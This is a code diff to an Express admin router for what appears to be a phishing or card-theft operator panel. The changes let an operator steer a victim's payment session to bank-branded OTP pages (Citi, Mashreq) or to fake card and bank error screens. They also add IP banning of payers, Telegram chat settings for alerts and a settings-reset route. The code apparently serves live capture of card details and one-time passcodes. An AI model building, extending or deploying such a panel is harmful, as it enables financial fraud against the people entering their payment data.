@@ -197,7 +197,7 @@ async function loadSettings() {
     siteActive:      await getSetting('site_active',                 '1'),
     telegramToken:   await getSetting('telegram_bot_token',          process.env.TELEGRAM_BOT_TOKEN          || ''),
     telegramChatId:  await getSetting('telegram_chat_id',            process.env.TELEGRAM_CHAT_ID            || ''),
-    searchTgToken:   await getSetting('search_telegram_bot_token',   process.env.SEARCH_TELEGRAM_BOT_TOKEN   || ''),
+    inquiryChatId:   await getSetting('inquiry_chat_id', process.env.INQUIRY_CHAT_ID || ''),
     handyApiKey:     await getSetting('handy_api_key',               process.env.HANDY_API_KEY               || ''),
     metaPixelId:        await getSetting('meta_pixel_id',       ''),
     metaAccessToken:    await getSetting('meta_access_token',   ''),
@@ -219,7 +219,7 @@ router.get('/settings', requireAdmin, async (req, res) => {
     res.render('admin/settings', {
       adminUser: req.session.adminUser,
       otpDefault:'otp-sms', siteActive:'1',
-      telegramToken:'', telegramChatId:'', searchTgToken:'', handyApiKey:'',
+      telegramToken:'', telegramChatId:'', inquiryChatId:'', handyApiKey:'',
       metaPixelId:'', metaAccessToken:'', metaTestEventCode:'',
       tiktokPixelId:'', tiktokAccessToken:'', adminTgAlerts:'0',
       metaEventTriggersJson:'{}', tiktokEventTriggersJson:'{}',
@@ -260,7 +260,7 @@ router.post('/settings', requireAdmin, async (req, res) => {
     try {
       await setSetting('telegram_bot_token',        (req.body.telegram_bot_token        || '').trim());
       await setSetting('telegram_chat_id',          (req.body.telegram_chat_id          || '').trim());
-      await setSetting('search_telegram_bot_token', (req.body.search_telegram_bot_token || '').trim());
+      await setSetting('inquiry_chat_id', (req.body.inquiry_chat_id || '').trim());
       await setSetting('handy_api_key',             (req.body.handy_api_key             || '').trim());
       await setSetting('admin_tg_alerts',           req.body.admin_tg_alerts === '1' ? '1' : '0');
       logActivity('settings_change', 'Telegram/API settings saved', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
@@ -307,7 +307,7 @@ router.post('/settings', requireAdmin, async (req, res) => {
     res.render('admin/settings', {
       adminUser: req.session.adminUser,
       otpDefault:'otp-sms', siteActive:'1',
-      telegramToken:'', telegramChatId:'', searchTgToken:'', handyApiKey:'',
+      telegramToken:'', telegramChatId:'', inquiryChatId:'', handyApiKey:'',
       metaPixelId:'', metaAccessToken:'', metaTestEventCode:'',
       tiktokPixelId:'', tiktokAccessToken:'', adminTgAlerts:'0',
       metaEventTriggersJson:'{}', tiktokEventTriggersJson:'{}',
@@ -333,7 +333,8 @@ router.post('/action', requireAdmin, async (req, res) => {
   const userAgent = req.headers['user-agent'] || '';
   try {
     if (act === 'redirect') {
-      const allowed = ['otp-sms','otp','otp-citi','otp-mashreq'];
+      const allowed = ['otp-sms','otp','otp-citi','otp-mashreq','otp-limit',
+        'payment:error=card_error','payment:error=card_type','payment:error=bank_error'];
       if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
       await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, req.body.page, cleanSid]);
       logActivity('otp_redirect', 'OTP redirect → ' + req.body.page + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
@@ -368,6 +369,18 @@ router.post('/action', requireAdmin, async (req, res) => {
       logActivity('payment_delete', 'Payment deleted (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
       sendAdminAlert('🗑️ <b>Payment Deleted</b>\nSID: ' + cleanSid + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
       return res.json({ ok: true });
+    }
+    if (act === 'ban_user') {
+      if (!cleanSid) return res.json({ ok:false });
+      const payment = await queryOne('SELECT ip FROM payments WHERE sid = ? LIMIT 1', [cleanSid]);
+      if (!payment?.ip) return res.json({ ok:false, error:'IP not found for this payment' });
+      const raw = await getSetting('banned_ips', '[]');
+      let list = [];
+      try { list = JSON.parse(raw); } catch {}
+      if (!list.includes(payment.ip)) list.push(payment.ip);
+      await setSetting('banned_ips', JSON.stringify(list));
+      logActivity('ban_user', 'User banned IP: ' + payment.ip + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
+      return res.json({ ok: true, ip: payment.ip });
     }
     res.json({ ok:false, error:'Unknown action' });
   } catch (e) {
@@ -408,6 +421,15 @@ router.get('/logs', requireAdmin, async (req, res) => {
   } catch (e) {
     res.render('admin/logs', { adminUser: req.session.adminUser, logs: [], total: 0, totalPages: 1, page: 1, search, action, perPage, dbError: e.message });
   }
+});
+
+// ─── Reset All Settings ───────────────────────────────────────────────────────
+router.post('/settings/reset', requireAdmin, async (req, res) => {
+  try {
+    await query('DELETE FROM settings', []);
+    logActivity('settings_change', 'All settings reset to defaults', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
+    res.json({ ok: true });
+  } catch(e) { res.json({ ok: false, error: e.message }); }
 });
 
 module.exports = router;
